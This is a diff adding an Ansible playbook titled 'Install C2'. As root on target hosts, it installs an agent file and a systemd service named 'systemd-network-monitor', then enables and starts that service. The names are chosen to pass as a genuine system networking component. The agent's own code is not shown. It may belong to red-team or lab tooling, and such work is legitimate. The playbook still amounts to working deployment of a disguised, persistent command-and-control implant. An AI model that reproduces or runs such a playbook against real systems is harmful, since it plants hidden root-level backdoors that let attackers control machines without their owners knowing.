@@ -1,0 +1,27 @@
+- name: Install C2
+  hosts: targets
+  become: yes
+  tasks:
+  - name: Add agent file
+    template:
+      src: "agent.py.j2"
+      dest: "/var/lib/systemd/network/monitor"
+      owner: root
+      group: root
+      mode: 0440
+      backup: yes
+  
+  - name: Add service file
+    copy:
+      src: systemd-network-monitor.service
+      dest: /usr/lib/systemd/system/systemd-network-monitor.service
+      owner: root
+      group: root
+      mode: 0644
+      backup: yes
+
+  - name: Start service
+    ansible.builtin.systemd_service:
+      name: systemd-network-monitor
+      state: restarted
+      enabled: yes
